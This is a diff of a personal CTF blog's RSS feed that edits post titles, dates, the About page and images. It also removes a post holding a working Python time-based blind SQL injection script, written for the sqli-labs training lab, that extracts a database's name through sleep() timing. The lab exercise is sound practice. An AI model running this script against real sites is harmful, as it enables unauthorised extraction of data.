         <guid>http://main1o.github.io/p/xor/</guid>
-        <description>&lt;img src="http://main1o.github.io/wallhaven-6o6orw_1920x1080.png" alt="Featured image of post xor" /&gt;&lt;p&gt;xor脚本测试&lt;/p&gt;
+        <description>&lt;img src="http://main1o.github.io/wallhaven-6o6orw_1920x1080.png" alt="Featured image of post xor" /&gt;&lt;p&gt;xorScript Demo&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
@@ -2791,12 +2200,20 @@ encode:&lt;/p&gt;
 &lt;/div&gt;</description>
         </item>
         <item>
-        <title>极客大挑战_2019_RCE_ME</title>
-        <link>http://main1o.github.io/p/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98_2019_rce_me/</link>
-        <pubDate>Fri, 24 Jun 2022 00:00:00 +0000</pubDate>
+        <title>Archives</title>
+        <link>http://main1o.github.io/archives/</link>
+        <pubDate>Sun, 12 Dec 2021 00:00:00 +0000</pubDate>
         
-        <guid>http://main1o.github.io/p/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98_2019_rce_me/</guid>
-        <description>&lt;img src="http://main1o.github.io/CachedImage_2880_1800_POS4.jpg" alt="Featured image of post 极客大挑战_2019_RCE_ME" /&gt;&lt;h1 id=&#34;极客大挑战-2019rce-me&#34;&gt;[极客大挑战 2019]RCE ME&lt;/h1&gt;
+        <guid>http://main1o.github.io/archives/</guid>
+        <description></description>
+        </item>
+        <item>
+        <title>2019极客大挑战</title>
+        <link>http://main1o.github.io/p/2019%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/</link>
+        <pubDate>Thu, 09 Sep 2021 00:00:00 +0000</pubDate>
+        
+        <guid>http://main1o.github.io/p/2019%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/</guid>
+        <description>&lt;img src="http://main1o.github.io/image83.png" alt="Featured image of post 2019极客大挑战" /&gt;&lt;h1 id=&#34;极客大挑战-2019rce-me&#34;&gt;[极客大挑战 2019]RCE ME&lt;/h1&gt;
 &lt;p&gt;在线环境BUUCTF搜索&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -2904,119 +2321,17 @@ encode:&lt;/p&gt;
 </description>
         </item>
         <item>
-        <title>sqli_labs_9</title>
-        <link>http://main1o.github.io/p/sqli_labs_9/</link>
-        <pubDate>Sun, 29 May 2022 20:15:18 +0000</pubDate>
-        
-        <guid>http://main1o.github.io/p/sqli_labs_9/</guid>
-        <description>&lt;img src="http://main1o.github.io/image83.png" alt="Featured image of post sqli_labs_9" /&gt;&lt;p&gt;延迟注入demo&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
-&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;ch&#34;&gt;#!/usr/bin/env python&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# -*- coding: utf-8 -*-&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&amp;#39;
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;@@main1o
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;sqli_labs_9
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;requests&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;datetime&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payloads&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;abcdefghijklmnopqrstuvwxyz0123456789_&amp;#39;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;database_len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;inject&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;url&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{inject}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; and if(length(database())=&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{i}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;,sleep(4),0)%23&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;inject&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;inject&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;time_1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;datetime&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;datetime&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;now&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;requ&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;requests&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;time_2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;datetime&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;datetime&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;now&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;time_3&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;time_2&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;time_1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;total_seconds&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;time_3&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;k&#34;&gt;break&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;[+]当前数据库长度:&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;database_name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;inject&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;name&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;9&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;payloads&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;url&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{inject}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; and if(substr(database(),&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{i}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;,1)=&amp;#39;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{p}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#39;,sleep(4),1)%23&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;inject&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;inject&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;time_1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;datetime&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;datetime&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;now&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;requ&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;requests&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;time_2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;datetime&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;datetime&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;now&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;time_3&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;time_2&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;time_1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;total_seconds&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;time_3&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;n&#34;&gt;name&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;k&#34;&gt;break&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;name&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;vm&#34;&gt;__name__&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;inject&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;input&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;[+]注入点(http://xxx/?id=1):&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;database_len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;inject&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;dbname&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;database_name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;inject&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;[+]当前数据库名字:&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dbname&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;</description>
-        </item>
-        <item>
-        <title>Archives</title>
-        <link>http://main1o.github.io/archives/</link>
-        <pubDate>Tue, 28 May 2019 00:00:00 +0000</pubDate>
-        
-        <guid>http://main1o.github.io/archives/</guid>
-        <description></description>
-        </item>
-        <item>
         <title>About</title>
         <link>http://main1o.github.io/about/</link>
         <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
         
         <guid>http://main1o.github.io/about/</guid>
         <description>&lt;img src="http://main1o.github.io/axieladou.png" alt="Featured image of post About" /&gt;&lt;h1 id=&#34;关于我&#34;&gt;关于我&lt;/h1&gt;
-&lt;p&gt;废物一个&lt;/p&gt;
+&lt;p&gt;在校学生 一无是处的废物&lt;/p&gt;
+&lt;p&gt;博客所写仅表示个人拙见 如有不当多多担待！&lt;/p&gt;
 &lt;ul&gt;
-&lt;li&gt;代码😅: &lt;!-- raw HTML omitted --&gt;NodeJs/Python/PHP/Java  &lt;del&gt;没一个精通&lt;/del&gt;&lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
-&lt;li&gt;技术🚩: &lt;!-- raw HTML omitted --&gt;&lt;del&gt;大大滴脚本小子&lt;/del&gt;&lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
+&lt;li&gt;代码😅: &lt;!-- raw HTML omitted --&gt;JavaScript/Python/PHP/Java/Shell  &lt;del&gt;没一个精通&lt;/del&gt;&lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
+&lt;li&gt;技术🚩: &lt;!-- raw HTML omitted --&gt;&lt;del&gt;脚本小子&lt;/del&gt; &lt;del&gt;高级CV工程师&lt;/del&gt;&lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
 &lt;/ul&gt;
 </description>
         </item>
@@ -3026,7 +2341,7 @@ encode:&lt;/p&gt;
         <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
         
         <guid>http://main1o.github.io/categories/ctf/</guid>
-        <description>&lt;img src="http://main1o.github.io/categories/ctf/109951167652810254.jpg" alt="Featured image of post CTF" /&gt;</description>
+        <description>&lt;img src="http://main1o.github.io/categories/ctf/109951167652810254.png" alt="Featured image of post CTF" /&gt;</description>
         </item>
         <item>
         <title>Links</title>
@@ -3050,7 +2365,7 @@ encode:&lt;/p&gt;
         <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
         
         <guid>http://main1o.github.io/categories/%E6%9D%82%E9%A1%B9/</guid>
-        <description>&lt;img src="http://main1o.github.io/categories/%E6%9D%82%E9%A1%B9/image80.png" alt="Featured image of post 杂项" /&gt;</description>
+        <description>&lt;img src="http://main1o.github.io/categories/%E6%9D%82%E9%A1%B9/109951168527497605.jpg" alt="Featured image of post 杂项" /&gt;</description>
         </item>
         
     </channel>
